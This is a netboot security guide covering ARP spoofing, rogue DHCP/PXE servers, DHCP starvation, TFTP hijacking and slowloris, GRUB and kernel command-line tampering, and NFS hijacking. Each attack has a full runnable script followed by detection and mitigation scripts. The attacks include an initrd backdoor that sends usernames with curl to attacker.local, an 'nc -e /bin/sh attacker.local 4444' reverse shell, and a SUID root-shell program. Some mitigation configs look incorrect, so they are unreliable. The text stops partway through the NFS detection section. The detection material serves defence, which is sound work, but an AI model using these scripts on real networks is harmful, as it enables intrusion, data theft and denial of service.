# Netboot Security: Complete Vulnerability & Attack Analysis

---

## Table of Contents
1. Network Layer Attacks
2. DHCP/PXE Attacks
3. TFTP Attacks
4. Bootloader Attacks
5. Kernel/Initramfs Attacks
6. NFS Attacks
7. Privilege Escalation
8. Testing Framework
9. Mitigation Strategies

---

## Part 1: Network Layer Attacks

### Attack 1.1: ARP Spoofing / Man-in-the-Middle (MITM)

**Vulnerability:** Unencrypted DHCP and TFTP traffic over network

**Risk Level:** 🔴 CRITICAL

**How it works:**
```
Normal Flow:
Client (192.168.1.100) → DHCP Server (192.168.1.1)
                      ↓
                   Get IP + Boot Server Info
                      ↓
Client → TFTP Server (192.168.1.1) → Download pxelinux.0

MITM Flow:
Attacker → ARP Spoof → Become 192.168.1.1
                      ↓
Client sends DHCP request to attacker (fake 192.168.1.1)
                      ↓
Attacker responds with malicious bootloader
                      ↓
Client boots attacker's custom OS / malware
```

**Exploit Setup:**

```bash
#!/bin/bash
# arp-spoof-attack.sh - ARP spoofing to intercept netboot

# Requirements: arpspoof (from dsniff package)
# sudo apt install dsniff

TARGET_IP="192.168.1.100"        # Client machine IP
GATEWAY_IP="192.168.1.1"          # Real gateway/DHCP server
ATTACKER_IP="192.168.1.50"        # Attacker machine IP
INTERFACE="eth0"

echo "[*] Starting ARP spoofing attack..."

# Enable IP forwarding to relay traffic
sudo sysctl -w net.ipv4.ip_forward=1

# Start ARP spoofing
# Make target think attacker is the gateway
sudo arpspoof -i $INTERFACE -t $TARGET_IP $GATEWAY_IP &
ARPSPOOF_PID=$!

# Make gateway think attacker is the target
sudo arpspoof -i $INTERFACE -t $GATEWAY_IP $TARGET_IP &
ARPSPOOF_PID2=$!

# Set up fake DHCP server on attacker
# This responds to client's DHCP requests
dnsmasq -d -q \
  -p 5353 \
  --dhcp-range=192.168.1.100,192.168.1.150 \
  --dhcp-option=3,192.168.1.50 \
  --dhcp-option=6,8.8.8.8 \
  --dhcp-option=66,192.168.1.50 \
  --dhcp-option=67,pxelinux.0 \
  --tftp-root=/tmp/malicious-tftp &
DNSMASQ_PID=$!

# Set up malicious TFTP with backdoored bootloader
mkdir -p /tmp/malicious-tftp/boot
cp ./malicious-kernel /tmp/malicious-tftp/boot/vmlinuz-6.1.0
cp ./malicious-initrd /tmp/malicious-tftp/boot/initrd.img
cp ./pxelinux.0 /tmp/malicious-tftp/

# Start TFTP server
sudo in.tftpd -l -s /tmp/malicious-tftp -vvv &
TFTP_PID=$!

echo "[+] ARP spoof active. Client boots will use malicious images."
echo "[+] Press Ctrl+C to stop"

trap "kill $ARPSPOOF_PID $ARPSPOOF_PID2 $DNSMASQ_PID $TFTP_PID; exit" INT

wait
```

**Detection & Testing:**

```bash
#!/bin/bash
# test-arp-spoof-resilience.sh

# 1. Monitor ARP traffic for anomalies
sudo arpwatch -i eth0 > /tmp/arp-monitor.log &

# Trigger netboot on client

# Check for suspicious ARP patterns
grep "CHANGED" /tmp/arp-monitor.log | wc -l
# High count = potential ARP spoofing

# 2. Use tcpdump to detect
sudo tcpdump -i eth0 -A 'arp' > /tmp/arp-traffic.pcap

# Analyze with Wireshark
wireshark /tmp/arp-traffic.pcap

# 3. Manual ARP table inspection
arp -a | grep -v "gateway\|router"  # Look for suspicious entries
ip neigh show | sort | uniq -d  # Duplicate MAC entries

# 4. Use arping to verify gateway
arping -c 5 192.168.1.1
# If responses vary wildly, ARP spoofing detected
```

**Mitigation:**

```bash
# 1. Use Static ARP entries (on DHCP server)
cat > /etc/ethers << 'EOF'
# MAC Address      IP Address
aa:bb:cc:dd:ee:ff 192.168.1.1
11:22:33:44:55:66 192.168.1.50
EOF

# 2. Enable DHCP Snooping (on managed switch)
# Configuration varies by switch model
# Usually under: VLAN > DHCP Snooping

# 3. Implement Dynamic ARP Inspection (DAI)
# Also switch-based, prevents ARP replies from unauthorized devices

# 4. Use DHCP IP Source Guard
# Prevents DHCP from unauthorized ports

# 5. Use VLANs to isolate netboot traffic
# Put netboot clients on separate VLAN with access controls
```

---

### Attack 1.2: DHCP Starvation / Denial of Service

**Vulnerability:** DHCP server can be exhausted by requesting all available IPs

**Risk Level:** 🟠 HIGH

**Exploit:**

```bash
#!/bin/bash
# dhcp-starvation.sh - Exhaust DHCP pool

# Requirements: dhcpig
# sudo apt install dhcpig

INTERFACE="eth0"
NUM_REQUESTS=500

echo "[*] Launching DHCP starvation attack..."

# Method 1: Using dhcpig
sudo dhcpig -i $INTERFACE

# Method 2: Manual with scapy (Python)
python3 << 'PYTHON'
from scapy.all import *
import threading

def send_dhcp_requests():
    for i in range(500):
        # Generate random MAC addresses
        mac = RandMAC()
        
        # Send DHCP Discovery
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) / \
              IP(src="0.0.0.0", dst="255.255.255.255") / \
              UDP(sport=68, dport=67) / \
              BOOTP(chaddr=mac) / \
              DHCP(options=[("message-type","discover"),"end"])
        
        send(pkt, verbose=False)
        print(f"[+] DHCP request {i+1} sent from {mac}")

# Run in multiple threads for faster exhaustion
threads = []
for t in range(10):
    th = threading.Thread(target=send_dhcp_requests)
    threads.append(th)
    th.start()

for th in threads:
    th.join()

print("[+] DHCP pool exhausted - legitimate clients cannot get IPs")
PYTHON
```

**Detection & Testing:**

```bash
#!/bin/bash
# test-dhcp-resilience.sh

# 1. Monitor DHCP lease pool
watch -n 1 'dnsmasq-lease-check'  # If using dnsmasq

# Or check DHCP lease file
watch -n 1 'cat /var/lib/dnsmasq/dnsmasq.leases | wc -l'

# 2. Use tcpdump to count DHCP requests
sudo tcpdump -i eth0 'port 67 or port 68' -w /tmp/dhcp.pcap

# Analyze
sudo tcpdump -r /tmp/dhcp.pcap | grep -c "DHCP"

# 3. Check for many IPs from same subnet
cat /var/lib/dnsmasq/dnsmasq.leases | \
  awk -F' ' '{print $3}' | sort | uniq -c | sort -rn

# If count >> expected clients = starvation attempt
```

**Mitigation:**

```bash
# 1. Implement DHCP rate limiting
cat >> /etc/dnsmasq.conf << 'EOF'
# Limit DHCP requests per second per interface
dhcp-option=option:option-150,""
# Limit allocation speed
dhcp-hostsfile=/etc/dnsmasq-hosts

# MAC-based rate limiting (custom script required)
EOF

# 2. Use ISC DHCP with limit
cat >> /etc/dhcp/dhcpd.conf << 'EOF'
# Limit new allocations
option delayed-ack 1;
option max-transmit-delay 300;
EOF

# 3. Implement MAC filtering
# Only allow known MACs to boot
cat > /srv/tftp/pxelinux.cfg/00-default << 'EOF'
# Whitelist only known MACs
NOESCAPE 1
ALLOWOPTIONS 1

# Fall through for unknown MACs (requires manual testing)
LABEL unknown
  KERNEL /boot/no-boot.img
EOF

# 4. Use network ACLs
# Allow only authorized MAC addresses on boot network
# Configure on managed switch/firewall
```

---

## Part 2: DHCP/PXE Attacks

### Attack 2.1: Rogue DHCP/PXE Server

**Vulnerability:** No authentication of DHCP server responses

**Risk Level:** 🔴 CRITICAL

**Exploit:**

```bash
#!/bin/bash
# rogue-pxe-server.sh - Set up fake DHCP/PXE server

MALICIOUS_IP="192.168.1.200"
INTERFACE="eth0"

# Create malicious tftp content
mkdir -p /tmp/rogue-tftp/{boot,pxelinux.cfg}

# Create backdoored kernel with hidden SSH
# (In real attack: use rootkit, backdoor shell, data exfiltration payload)
cp ./custom-kernel-backdoor /tmp/rogue-tftp/boot/vmlinuz
cp ./custom-initrd-backdoor /tmp/rogue-tftp/boot/initrd.img
cp ./pxelinux.0 /tmp/rogue-tftp/

# Create malicious menu
cat > /tmp/rogue-tftp/pxelinux.cfg/default << 'EOF'
DEFAULT malicious
LABEL malicious
  KERNEL /boot/vmlinuz
  APPEND init=/backdoor.sh ro console=tty0 quiet
  IPAPPEND 2
EOF

# Start dnsmasq as rogue DHCP
sudo dnsmasq -d -q \
  --interface=$INTERFACE \
  --bind-interfaces \
  --dhcp-range=192.168.1.100,192.168.1.254 \
  --dhcp-option=3,192.168.1.1 \
  --dhcp-option=66,$MALICIOUS_IP \
  --dhcp-option=67,pxelinux.0 \
  --tftp-root=/tmp/rogue-tftp &

# Start TFTP server
sudo in.tftpd -l -s /tmp/rogue-tftp &

echo "[+] Rogue PXE server active on $MALICIOUS_IP"
echo "[+] Clients will boot from malicious kernel"
```

**Detection & Testing:**

```bash
#!/bin/bash
# test-rogue-pxe-detection.sh

# 1. Monitor for multiple DHCP servers
sudo tcpdump -i eth0 'port 67' -A | \
  grep -i "server-id\|option 54" | sort | uniq

# Multiple different server IDs = multiple DHCP servers detected

# 2. Check DHCP server consistency
for i in {1..5}; do
  echo "=== DHCP Request $i ==="
  dhclient -v eth0 2>&1 | grep "DHCP"
  sleep 2
done

# If server IP changes = Rogue DHCP server

# 3. Monitor TFTP sources
sudo tcpdump -i eth0 'port 69' -A | \
  grep "tftp:" | awk '{print $3}' | sort | uniq -c

# Multiple TFTP IPs = Multiple servers

# 4. Check Option 66 (boot server) consistency
nmap -sU -p 67 --script dhcp-discover 192.168.1.1

# Compare results with expected values
```

**Mitigation:**

```bash
# 1. DHCP Server Authentication (complex, requires PKI)
# Use DHCP authentication option (82)
cat >> /etc/dhcp/dhcpd.conf << 'EOF'
# DHCP Authentication
omapi-port 7911;
key omapi_key {
  algorithm HMAC-MD5;
  secret "your-secret-key-here";
};
EOF

# 2. Use only authorized DHCP on managed switch
# Configure port security to allow only one MAC per port
# Configure DHCP snooping to block unauthorized servers

# 3. Implement DHCP Firewall Rules
sudo ufw allow from 192.168.1.1 port 67
sudo ufw deny from any port 67 to any

# 4. Monitor DHCP server responses
sudo tcpdump -i eth0 -A 'udp port 67 or port 68' > /tmp/dhcp-monitor.log

# Alert on unexpected responses
grep -oP "option 66 = \K[0-9.]+" /tmp/dhcp-monitor.log | \
  sort | uniq | while read ip; do
    if [ "$ip" != "192.168.1.1" ]; then
      echo "ALERT: Rogue DHCP server detected at $ip"
    fi
  done
```

---

### Attack 2.2: DHCP Option Injection

**Vulnerability:** DHCP options not validated by clients

**Risk Level:** 🟠 HIGH

**Exploit:**

```bash
#!/bin/bash
# dhcp-option-injection.sh - Inject malicious DHCP options

# Create dnsmasq config with malicious options
cat > /tmp/rogue-dnsmasq.conf << 'EOF'
# Inject malicious DNS (option 6)
dhcp-option=6,192.168.1.200

# Inject malicious NTP (option 42)
dhcp-option=42,192.168.1.200

# Inject malicious gateway (option 3)
dhcp-option=3,192.168.1.200

# Inject malicious boot server (option 66)
dhcp-option=66,192.168.1.200

# Inject malicious boot filename (option 67)
dhcp-option=67,malicious-pxelinux.0

# Add custom options
# Option 119: Domain search
dhcp-option=119,attacker.local

# Option 251: DHCP Auto-Configuration (if vulnerable client)
dhcp-option=251,http://attacker.local/wpad.dat
EOF

# Start fake DHCP with injected options
sudo dnsmasq -C /tmp/rogue-dnsmasq.conf
```

**Detection & Testing:**

```bash
#!/bin/bash
# test-dhcp-option-injection.sh

# 1. Capture and analyze DHCP responses
sudo tcpdump -i eth0 'port 68' -A > /tmp/dhcp-response.log

# Parse DHCP options
grep -oP 'Option: \([0-9]+\) .*' /tmp/dhcp-response.log | sort | uniq

# Verify against expected config
# Compare with /etc/dnsmasq.conf

# 2. Check received DHCP configuration
sudo dhclient -v eth0 2>&1 | grep -i "option\|server"

# 3. Monitor DNS queries for redirection
sudo tcpdump -i eth0 'port 53' -A | grep -i "server\|dns"

# 4. Check gateway consistency
route -n | grep default

# Should match: netstat -rn | grep "^0.0.0.0"
```

**Mitigation:**

```bash
# 1. Validate all DHCP options before use
cat > /etc/dhcp/validate-options.sh << 'EOF'
#!/bin/bash
# Validate DHCP received options

EXPECTED_GATEWAY="192.168.1.1"
EXPECTED_BOOT_SERVER="192.168.1.1"
EXPECTED_DNS="8.8.8.8,8.8.4.4"

# Extract from DHCP
gateway=$(ip route | grep default | awk '{print $3}')
boot_server=$(grep "next-server" /var/lib/dhcp/dhclient.leases | \
  head -1 | awk '{print $NF}' | tr -d ';')

if [ "$gateway" != "$EXPECTED_GATEWAY" ]; then
  echo "ALERT: Unexpected gateway: $gateway"
  exit 1
fi

if [ "$boot_server" != "$EXPECTED_BOOT_SERVER" ]; then
  echo "ALERT: Unexpected boot server: $boot_server"
  exit 1
fi
EOF

chmod +x /etc/dhcp/validate-options.sh

# 2. Use DHCP snooping on switch
# Configure trusted DHCP ports

# 3. Implement network segmentation
# Place netboot clients on isolated VLAN
```

---

## Part 3: TFTP Attacks

### Attack 3.1: TFTP File Download Hijacking

**Vulnerability:** TFTP has no encryption or file integrity verification

**Risk Level:** 🔴 CRITICAL

**Exploit:**

```bash
#!/bin/bash
# tftp-hijack.sh - Intercept and modify TFTP transfers

# Set up fake TFTP with compromised files
mkdir -p /tmp/fake-tftp/boot

# Create modified kernel with backdoor
# (In real scenario: inject rootkit, reverse shell, etc.)
cp /srv/tftp/boot/vmlinuz-6.1.0 /tmp/fake-tftp/boot/
./inject-backdoor /tmp/fake-tftp/boot/vmlinuz-6.1.0

# Create modified initrd with compromised init script
mkdir -p /tmp/initrd-modified/
cd /tmp/initrd-modified
gunzip -c /srv/tftp/boot/initrd-netboot.img | cpio -idm

# Modify init script to add backdoor
cat >> init << 'EOF'
# Backdoor: exfiltrate credentials
curl -d "hostname=$(hostname)&users=$(getent passwd | cut -d: -f1)" \
  http://attacker.local/collect &
EOF

# Repackage modified initrd
find . | cpio -H newc -o | gzip > /tmp/fake-tftp/boot/initrd-netboot.img

# Copy modified pxelinux config
cp /srv/tftp/pxelinux.cfg/default /tmp/fake-tftp/pxelinux.cfg/
echo "MODIFIED BOOT SERVER" >> /tmp/fake-tftp/pxelinux.cfg/default

# Start rogue TFTP
sudo in.tftpd -l -s /tmp/fake-tftp -vvv &

echo "[+] TFTP hijacking set up. Clients will receive modified files."
```

**Detection & Testing:**

```bash
#!/bin/bash
# test-tftp-integrity.sh

# 1. Calculate checksums before deployment
sha256sum /srv/tftp/boot/vmlinuz-6.1.0 > /tmp/kernel.sha256
sha256sum /srv/tftp/boot/initrd-netboot.img > /tmp/initrd.sha256
sha256sum /srv/tftp/boot/filesystem.squashfs > /tmp/squashfs.sha256

# Store these in secure location

# 2. During boot, verify checksums
# Add to initramfs init script:
cat >> /init << 'EOF'
# Verify file integrity during download
# This is done AFTER TFTP download in a real scenario

# In practice: checksum would be stored in TPM or secure config
EXPECTED_KERNEL_SHA="abc123..."

# After downloading kernel
ACTUAL_SHA=$(sha256sum /boot/vmlinuz | cut -d' ' -f1)

if [ "$ACTUAL_SHA" != "$EXPECTED_KERNEL_SHA" ]; then
  echo "CRITICAL: Kernel integrity check failed!"
  echo "Possible TFTP hijacking attack detected"
  halt -f
fi
EOF

# 3. Monitor TFTP transfers
sudo tcpdump -i eth0 'port 69' -w /tmp/tftp.pcap

# Analyze
sudo tcpdump -r /tmp/tftp.pcap -A | head -100

# Check for unexpected file transfers
tshark -r /tmp/tftp.pcap -T fields -e tftp.source_file -e tftp.destination_file | \
  sort | uniq
```

**Mitigation:**

```bash
# 1. Implement TFTP over TLS (if supported)
# Modern TFTP implementations may support encryption

# 2. Use checksums/signatures
# Deploy checksums via secure channel (out-of-band)
# Verify after download in initramfs

# 3. Use HTTP/HTTPS instead of TFTP
# If bootloader supports it (GRUB does)
cat >> /srv/tftp/grub/grub.cfg << 'EOF'
# Use HTTPS for better security
set root=(https,192.168.1.1)
linux https://192.168.1.1/boot/vmlinuz-6.1.0
initrd https://192.168.1.1/boot/initrd.img
EOF

# Configure HTTPS server
sudo apt install nginx
# Setup self-signed certs or proper certs

# 4. Network segmentation
# Isolate TFTP traffic to specific network segment

# 5. File system permissions
chmod 644 /srv/tftp/boot/*
chmod 755 /srv/tftp/
chmod 755 /srv/tftp/boot

# 6. Monitor TFTP access
sudo auditctl -w /srv/tftp -p wa -k tftp_changes
```

---

### Attack 3.2: TFTP Slow Loris Denial of Service

**Vulnerability:** TFTP doesn't handle connection timeouts well

**Risk Level:** 🟡 MEDIUM

**Exploit:**

```bash
#!/bin/bash
# tftp-slowloris.sh - Slow TFTP transfer attack

python3 << 'PYTHON'
import socket
import time

TARGET_IP = "192.168.1.1"
TARGET_PORT = 69
BLOCK_SIZE = 512

def tftp_slowloris():
    """Send slow TFTP packets to exhaust server"""
    
    for i in range(100):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # TFTP Read Request (RRQ)
        packet = b'\x00\x01'  # Opcode: READ
        packet += b'vmlinuz-6.1.0\x00'
        packet += b'octet\x00'
        
        sock.sendto(packet, (TARGET_IP, TARGET_PORT))
        
        # Send acknowledgments very slowly
        for block_num in range(1, 1000):
            time.sleep(1)  # Slow response
            
            # ACK for block
            ack = b'\x00\x04'  # Opcode: ACK
            ack += block_num.to_bytes(2, 'big')
            
            try:
                sock.sendto(ack, (TARGET_IP, TARGET_PORT))
            except:
                break
        
        print(f"[+] Slowloris connection {i+1} active")
        time.sleep(0.5)

tftp_slowloris()
PYTHON
```

**Detection & Testing:**

```bash
#!/bin/bash
# test-tftp-dos-resilience.sh

# 1. Monitor active TFTP connections
watch -n 1 'netstat -an | grep :69 | wc -l'

# Count UDP sockets to TFTP
watch -n 1 'ss -u | grep 69 | wc -l'

# 2. Monitor server response time
time timeout 10 tftp -m binary 192.168.1.1 << 'EOF'
get vmlinuz-6.1.0
quit
EOF

# 3. Check TFTP server logs
sudo tail -f /var/log/tftpd.log | grep -E "timeout|error|slow"

# 4. Measure bandwidth usage
sudo iftop -i eth0 | grep 69

# 5. Check for connection backlog
netstat -an | grep LISTEN | grep 69
```

**Mitigation:**

```bash
# 1. Configure TFTP timeout
# Edit tftpd-hpa service
cat > /etc/default/tftpd-hpa << 'EOF'
TFTP_USERNAME="tftp"
TFTP_DIRECTORY="/srv/tftp"
TFTP_ADDRESS="0.0.0.0:69"
TFTP_OPTIONS="--secure --permissive -vvv --timeout 5"
EOF

# 2. Use TCP-based alternatives (HTTP/HTTPS)
# Switch to HTTP for kernel/initramfs delivery

# 3. Implement rate limiting
sudo tc qdisc add dev eth0 root tbf rate 100mbit burst 32kbit latency 400ms

# 4. Firewall rules to limit connections per IP
sudo ufw limit from any port 69
```

---

## Part 4: Bootloader Attacks

### Attack 4.1: GRUB Password Bypass / Modification

**Vulnerability:** GRUB config accessible over TFTP without authentication

**Risk Level:** 🔴 CRITICAL

**Exploit:**

```bash
#!/bin/bash
# grub-config-modification.sh - Modify boot parameters

# Download current grub.cfg
tftp -m binary 192.168.1.1 << 'EOF'
get /grub/grub.cfg
quit
EOF

# Modify grub.cfg to add backdoor entry
cat >> grub.cfg << 'GRUBEOF'
menuentry 'Backdoor OS' {
  set root=(tftp,192.168.1.1)
  
  # Boot backdoored kernel
  linux /boot/vmlinuz-6.1.0 \
    rw init=/bin/bash \
    root=/dev/nfs nfsroot=192.168.1.1:/export/custom-os \
    ip=dhcp
  
  # Skip integrity checks
  insmod gcry_arcfour
  insmod gcry_rijndael
  insmod gcry_sha1
  insmod gcry_sha256
  
  initrd /boot/initrd-netboot.img
}
GRUBEOF

# Upload modified grub.cfg
# (Requires write access to TFTP - another vulnerability if present)
tftp -m binary 192.168.1.1 << 'EOF'
put grub.cfg /grub/grub.cfg
quit
EOF

# Or inject via MITM
# Replace legitimate grub.cfg with modified version
```

**Detection & Testing:**

```bash
#!/bin/bash
# test-grub-tampering-detection.sh

# 1. Verify grub.cfg checksums
sha256sum /srv/tftp/grub/grub.cfg > /tmp/grub.sha256.baseline

# After each modification
sha256sum /srv/tftp/grub/grub.cfg > /tmp/grub.sha256.current

# Compare
diff /tmp/grub.sha256.baseline /tmp/grub.sha256.current

# 2. Monitor grub.cfg access
sudo auditctl -w /srv/tftp/grub/grub.cfg -p wa -k grub_changes

# Check logs
sudo ausearch -k grub_changes

# 3. Validate grub.cfg syntax before deployment
grub-script-check /srv/tftp/grub/grub.cfg

# 4. Check for suspicious menu entries
grep -n "menuentry\|init=\|bash\|sh$" /srv/tftp/grub/grub.cfg

# Alert if init is not /sbin/init
grep "init=" /srv/tftp/grub/grub.cfg | grep -v "init=/sbin/init"
```

**Mitigation:**

```bash
# 1. GRUB Password Protection
sudo grub-mkpasswd-pbkdf2 > /tmp/grub-pass.hash

# Add to grub config
cat >> /srv/tftp/grub/grub.cfg << 'EOF'
set superusers="root"
export superusers
priv_load

# Require password for specific menus
menuentry 'Custom OS' --users "" {
  # Public entry, no password needed
  set root=(tftp,192.168.1.1)
  linux /boot/vmlinuz-6.1.0 ro ip=dhcp
  initrd /boot/initrd.img
}

menuentry 'Diagnostics' --users root {
  # Requires password
  # Password hash from grub-mkpasswd-pbkdf2
}
EOF

# 2. Sign GRUB configuration
# Use GRUB secure boot (if EFI firmware supports)

# 3. Read-only GRUB config
chmod 444 /srv/tftp/grub/grub.cfg
# Prevent accidental modifications

# 4. File integrity monitoring
aide /srv/tftp/grub/

# 5. Secure boot and measured boot
# Configure UEFI Secure Boot to verify bootloader signatures
```

---

### Attack 4.2: Bootloader Command Injection

**Vulnerability:** Kernel command line parameters not validated

**Risk Level:** 🔴 CRITICAL

**Exploit:**

```bash
#!/bin/bash
# bootloader-cmdline-injection.sh - Inject malicious kernel parameters

# Create malicious boot entry
cat > /tmp/grub.cfg << 'EOF'
menuentry 'Custom OS' {
  set root=(tftp,192.168.1.1)
  
  # Injected malicious parameters
  linux /boot/vmlinuz-6.1.0 \
    root=/dev/nfs \
    nfsroot=192.168.1.1:/export/custom-os \
    ip=dhcp \
    \
    # Command injection - these get passed to kernel
    init="/bin/sh -i" \                    # Interactive shell as root
    ro \
    console=tty0 \
    quiet \
    \
    # Kernel parameters that enable/disable features
    nosec \                                # Disable security features
    kpti=off \                             # Disable kernel page table isolation
    mitigations=off \                      # Disable CPU mitigations
    selinux=0 apparmor=0 \               # Disable SELinux/AppArmor
    audit=0 \                              # Disable audit logging
    sysrq=1 \                              # Enable Magic SysRq
    rd.shell rd.debug \                   # Drop to shell for debugging
    
    # Memory exploitation
    panic=10 oops=panic \                 # Trigger kernel panic
    crash_kexec_post_notifiers \          # Execute code on crash
    
    # Module loading
    modprobe.blacklist=integrity \        # Disable integrity checking
    
    # Network parameters
    ip=192.168.1.100::192.168.1.1:255.255.255.0 \
    \
    # Backdoor via kernel module loading
    rd.modules=meterpreter \              # Load backdoor module
    insmod=/path/to/rootkit.ko \         # Load rootkit
    
    # Early userspace manipulation
    rd.debug \                            # Enable debugging
    rdshell                              # Drop to shell
  
  initrd /boot/initrd-netboot.img
}
EOF
```

**How it works:**
- `init=/bin/sh -i` - Boot directly to interactive shell as root
- `kpti=off, mitigations=off` - Disable security mitigations
- `sysrq=1` - Enable Magic SysRq key for local attacks
- `rd.shell` - Force drop to initramfs shell
- `selinux=0` - Disable mandatory access control

**Detection & Testing:**

```bash
#!/bin/bash
# test-cmdline-injection-detection.sh

# 1. Monitor actual kernel command line used
cat /proc/cmdline

# 2. Verify expected parameters only
EXPECTED_PARAMS="root=/dev/nfs ip=dhcp ro console="

# Check for suspicious ones
grep -oE '\b[a-z_]+=' /proc/cmdline | sort | uniq | while read param; do
  case "$param" in
    root=|ip=|ro|console=|nfsroot=|initrd=|append=)
      echo "✓ Legitimate: $param"
      ;;
    *)
      echo "⚠️  Suspicious: $param"
      ;;
  esac
done

# 3. Check for command injection indicators
grep -E "shell|bash|sh -i|sysrq|mitigations=off|kpti=off" /proc/cmdline && \
  echo "ALERT: Potential command injection detected!"

# 4. Audit boot parameter changes
sudo auditctl -w /proc/cmdline -p r -k cmdline_read

# 5. Monitor for Magic SysRq activity
sudo tail -f /var/log/messages | grep "sysrq"
```

**Mitigation:**

```bash
# 1. Whitelist allowed kernel parameters
cat > /srv/tftp/grub/grub.cfg << 'EOF'
# Secure GRUB config with hardened parameters

menuentry 'Custom OS' {
  set root=(tftp,192.168.1.1)
  
  # Only allow specific, safe parameters
  linux /boot/vmlinuz-6.1.0 \
    root=/dev/nfs \
    nfsroot=192.168.1.1:/export/custom-os \
    ip=dhcp \
    ro \
    console=tty0 \
    quiet \
    \
    # Security hardening
    kpti=on \
    mitigations=auto \
    selinux=1 \
    audit=1 \
    sysrq=0 \
    panic=0
  
  initrd /boot/initrd-netboot.img
}
EOF

# 2. Use GRUB secure boot with signatures
grub-mkimage -O x86_64-efi \
  -o grubx64.efi.signed \
  -p '(hd0,gpt1)/boot/grub' \
  -c /etc/grub.d/40_custom \
  part_gpt part_msdos \
  ext2 configfile normal linux

# 3. Kernel module loading restrictions
cat >> /etc/modprobe.d/netboot-security.conf << 'EOF'
# Block suspicious modules
blacklist meterpreter
blacklist ptrace_exploit
EOF

# 4. Disable Magic SysRq
sudo sysctl -w kernel.sysrq=0

# 5. Read-only root filesystem (if possible)
# Mount rootfs as read-only during boot
mount -o ro,remount /

# 6. Implement kernel hardening
cat >> /etc/sysctl.d/99-netboot-hardening.conf << 'EOF'
# Disable module loading after boot
kernel.modules_disabled=1

# Disable kexec (can be used for privilege escalation)
kernel.kexec_load_disabled=1

# Restrict kernel module loading to root
kernel.module_signature_enforce=1
EOF

# Apply
sudo sysctl -p
```

---

## Part 5: NFS Attacks

### Attack 5.1: NFS Mount Hijacking / Unauthorized Access

**Vulnerability:** NFS without authentication/encryption, can mount wrong export

**Risk Level:** 🔴 CRITICAL

**Exploit:**

```bash
#!/bin/bash
# nfs-hijacking.sh - Provide fake NFS export

# Create fake rootfs with backdoor
mkdir -p /tmp/fake-nfs/{bin,sbin,lib,etc,root}

# Add backdoor shell
cp /bin/bash /tmp/fake-nfs/bin/

# Create backdoor init
cat > /tmp/fake-nfs/sbin/init << 'EOF'
#!/bin/bash
# Exfiltrate data, establish reverse shell, etc.
nc -e /bin/sh attacker.local 4444 &
mount -t proc proc /proc
mount -t sysfs sysfs /sys
/sbin/getty 38400 tty1
EOF
chmod +x /tmp/fake-nfs/sbin/init

# Export fake NFS
cat >> /etc/exports << 'EOF'
/tmp/fake-nfs 192.168.1.0/24(ro,no_root_squash,insecure)
EOF

# Or modify existing export to add backdoor files
# Add SUID backdoor
cp /bin/bash /export/custom-os/bin/backdoor-shell
chmod 4755 /export/custom-os/bin/backdoor-shell

# Export NFS
exportfs -ra

echo "[+] NFS hijacking ready. Clients will boot backdoored OS."
```

**Detection & Testing:**

```bash
#!/bin/bash
# test-nfs-hijacking-detection.sh

# 1. Verify NFS server identity
showmount -e 192.168.1.1

# Check against known good list
cat > /tmp/expected-exports.txt << 'EOF'
/export/custom-os
/export/custom-os-persistent
EOF

# Compare
diff <(showmount -e 192.168.1.1 | sort) /tmp/expected-exports.txt

# 2. Check NFS mount source during boot
mount | grep nfs

# Verify mount point IP matches expected server
grep "192.168.1.1" /etc/mtab

# 3. Monitor NFS traffic
sudo tcpdump -i eth0 'port 111 or port 2049' -A > /tmp/nfs-traffic.log

# 4. Verify exported files checksums
# Mount NFS and verify files
mount -t nfs 192.168.1.1:/export/custom-os /mnt/verify

# Create checklist of critical files
for file in sbin/init bin/sh lib/libc.so.6 etc/passwd; do
  sha256sum /mnt/verify/$file >> /tmp/nfs-baseline.sha256
done

# Compare with baseline
diff /tmp/nfs-baseline.sha256 /tmp/nfs-live.sha256
```

**Mitigation:**

```bash
# 1. NFS Export restrictions
cat > /etc/exports << 'EOF'
# Restrict NFS exports by IP and permissions

# Read-only export for boot
/export/custom-os 192.168.1.100(ro,no_root_squash,insecure,no_subtree_check)

# Allow specific IPs only
/export/custom-os 192.168.1.100(ro,sync,root_squash)
/export/custom-os 192.168.1.101(ro,sync,root_squash)

# NOT:
# /export/custom-os *(ro)  # Don't allow all hosts
EOF

exportfs -ra

# 2. NFS with Kerberos authentication
# Complex setup, but most secure
sudo apt install nfs-utils krb5-user

# 3. Monitor NFS mounts
sudo tail -f /var/log/nfs*

# 4. Use NFSv4 with mandatory security (if available)
cat >> /etc/exports << 'EOF'
/export/custom-os 192.168.1.0/24(ro,sec=krb5:krb5i:krb5p)
EOF

# 5. File integrity checking on NFS mount
# Run after mount, before pivot_root
# In initramfs init:
cat >> /init << 'EOF'
# Verify critical files after NFS mount
mount -t nfs 192.168.1.1:/export/custom-os /mnt/root

# Verify checksums
if [ ! -f /mnt/root/.integrity-check.sh256 ]; then
  echo "CRITICAL: Integrity check file missing"
  halt -f
fi

# Check all critical files
grep "^" /mnt/root/.integrity-check.sha256 | \
  while read expected file; do
    actual=$(sha256sum "$file" | cut -d' ' -f1)
    if [ "$actual" != "$expected" ]; then
      echo "CRITICAL: File integrity check failed: $file"
      halt -f
    fi
  done
EOF

# 6. Read-only mount
mount -o ro,noexec,nosuid,nodev 192.168.1.1:/export/custom-os /mnt/root
```

---

### Attack 5.2: NFS Root Privilege Escalation

**Vulnerability:** root_squash disabled allows remote UID 0 access

**Risk Level:** 🔴 CRITICAL

**Exploit:**

```bash
#!/bin/bash
# nfs-privesc.sh - Exploit root_squash disabled

# If NFS export has "no_root_squash", attacker can become root on NFS

# From attacker machine:
mount -t nfs 192.168.1.1:/export/custom-os /mnt/nfs

# Create SUID backdoor
cat > /tmp/backdoor.c << 'C'
#include <unistd.h>
int main() {
  setuid(0);
  setgid(0);
  execl("/bin/bash", "/bin/bash", (char *) NULL);
}
C

gcc /tmp/backdoor.c -o /mnt/nfs/bin/backdoor-suid

# Change ownership to root (works because no_root_squash)
chown 0:0 /mnt/nfs/bin/backdoor-suid

# Set SUID bit
chmod 4755 /mnt/nfs/bin/backdoor-suid

# Now any user on the booted system can run:
# /bin/backdoor-suid
# And get root shell!
```

**Detection & Testing:**

```bash
#!/bin/bash
# test-root-squash-check.sh

# 1. Check NFS exports config
grep "no_root_squash" /etc/exports

# Should NOT contain this!
if grep -q "no_root_squash" /etc/exports; then
  echo "CRITICAL: no_root_squash found in exports!"
  echo "This allows privilege escalation"
fi

# 2. Verify from client side
# Check file ownership of NFS-mounted files
ls -la /mnt/nfs/ | grep "^-rwsr"  # SUID files

